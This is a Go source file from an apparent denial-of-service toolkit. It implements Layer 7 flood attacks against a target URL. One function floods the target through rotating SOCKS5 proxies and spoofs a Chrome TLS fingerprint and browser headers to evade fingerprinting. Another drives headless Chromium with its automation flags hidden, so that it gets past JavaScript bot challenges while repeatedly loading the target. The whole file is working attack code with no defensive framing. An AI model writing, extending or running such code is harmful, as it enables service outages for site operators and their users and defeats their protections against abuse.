package attacks

import (
	"context"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"sync"
	"time"

	"cyberblitz-go/pkg/spoofing"
	"github.com/playwright-community/playwright-go"
	utls "github.com/refraction-networking/utls"
	"golang.org/x/net/proxy"
)

// TLSAttack performs a Layer 7 attack using a custom TLS client to bypass fingerprinting.
func TLSAttack(ctx context.Context, target string, duration int, threads int, proxies []string, proxyType string) {
	attackType := "HTTPS-BYPASS"
	if len(proxies) > 0 {
		fmt.Printf("Starting TLS Attack (%s) on %s for %d seconds with %d threads via %d proxies.\n", attackType, target, duration, threads, len(proxies))
	} else {
		fmt.Printf("Starting TLS Attack (%s) on %s for %d seconds with %d threads.\n", attackType, target, duration, threads)
	}

	var wg sync.WaitGroup
	ctx, cancel := context.WithTimeout(ctx, time.Duration(duration)*time.Second)
	defer cancel()

	// This is the core dialing function that will be used by the HTTP transport.
	// It handles proxying and wraps the connection with uTLS.
	dialerFunc := func(ctx context.Context, network, addr string) (net.Conn, error) {
		var dialer proxy.Dialer
		dialer = &net.Dialer{
			Timeout:   10 * time.Second,
			KeepAlive: 10 * time.Second,
		}

		if len(proxies) > 0 {
			proxyURL := proxies[rand.Intn(len(proxies))]
			parsedURL, err := url.Parse(proxyURL)
			if err != nil {
				return nil, fmt.Errorf("could not parse proxy URL: %w", err)
			}
			if proxyType == "socks5" {
				dialer, err = proxy.FromURL(parsedURL, dialer)
				if err != nil {
					return nil, fmt.Errorf("could not create socks5 dialer: %w", err)
				}
			} else {
				// For HTTP/S proxy, we set it in the transport, not the dialer.
				// This path is tricky with uTLS. We'll focus on SOCKS for now.
			}
		}

		tcpConn, err := dialer.Dial(network, addr)
		if err != nil {
			return nil, err
		}

		config := &utls.Config{
			InsecureSkipVerify: true,
		}
		uconn := utls.UClient(tcpConn, config, utls.HelloChrome_120)
		return uconn, nil
	}

	client := &http.Client{
		Timeout: 10 * time.Second,
		Transport: &http.Transport{
			DialContext:           dialerFunc,
			MaxIdleConns:          100,
			IdleConnTimeout:       90 * time.Second,
			TLSHandshakeTimeout:   10 * time.Second,
			ExpectContinueTimeout: 1 * time.Second,
		},
	}

	for i := 0; i < threads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for {
				select {
				case <-ctx.Done():
					return
				default:
					profile := spoofing.NewBrowserProfile()
					req, err := http.NewRequestWithContext(ctx, "GET", target, nil)
					if err != nil {
						continue
					}

					for key, value := range profile.Headers {
						req.Header.Set(key, value)
					}

					resp, err := client.Do(req)
					if err == nil {
						io.Copy(io.Discard, resp.Body)
						resp.Body.Close()
					}
					time.Sleep(10 * time.Millisecond)
				}
			}
		}()
	}

	wg.Wait()
	fmt.Println("TLS Attack (HTTPS-BYPASS) finished.")
}

// BrowserAttack performs a Layer 7 attack using a headless browser to bypass JS challenges.
func BrowserAttack(ctx context.Context, target string, duration int, threads int) {
	fmt.Printf("Starting Browser Attack (HTTP-BROWSER) on %s for %d seconds with %d threads.\n", target, duration, threads)

	pw, err := playwright.Run()
	if err != nil {
		fmt.Printf("Error starting Playwright: %v\n", err)
		return
	}
	defer pw.Stop()

	browser, err := pw.Chromium.Launch(playwright.BrowserTypeLaunchOptions{
		Headless: playwright.Bool(true),
		Args: []string{
			"--disable-blink-features=AutomationControlled",
		},
	})
	if err != nil {
		fmt.Printf("Error launching browser: %v\n", err)
		return
	}
	defer browser.Close()

	// This is the JS script to inject, ported from the Python version.
	initScript := `
		delete Object.getPrototypeOf(navigator).webdriver;
		Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
	`

	var wg sync.WaitGroup
	ctx, cancel := context.WithTimeout(ctx, time.Duration(duration)*time.Second)
	defer cancel()

	for i := 0; i < threads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for {
				select {
				case <-ctx.Done():
					return
				default:
					profile := spoofing.NewBrowserProfile()
					context, err := browser.NewContext(playwright.BrowserNewContextOptions{
						UserAgent:        playwright.String(profile.UserAgent),
						ExtraHttpHeaders: profile.Headers,
					})
					if err != nil {
						continue
					}
					defer context.Close()

					// Inject the script to hide automation
					if err := context.AddInitScript(playwright.Script{Content: playwright.String(initScript)}); err != nil {
						continue
					}

					page, err := context.NewPage()
					if err != nil {
						continue
					}

					// Navigate and wait for the page to load, but don't care about the result.
					// The act of loading the page is the attack.
					_, _ = page.Goto(target, playwright.PageGotoOptions{
						WaitUntil: playwright.WaitUntilStateNetworkidle,
						Timeout:   playwright.Float(20000), // 20 seconds
					})

					page.Close()
					// A small delay before the next wave from this goroutine
					time.Sleep(100 * time.Millisecond)
				}
			}
		}()
	}

	wg.Wait()
	fmt.Println("Browser Attack (HTTP-BROWSER) finished.")
}

// HTTPAttack is a placeholder for a standard HTTP flood
func HTTPAttack(ctx context.Context, target string, duration int, threads int) {
	fmt.Printf("HTTPAttack not yet implemented.\n")
}
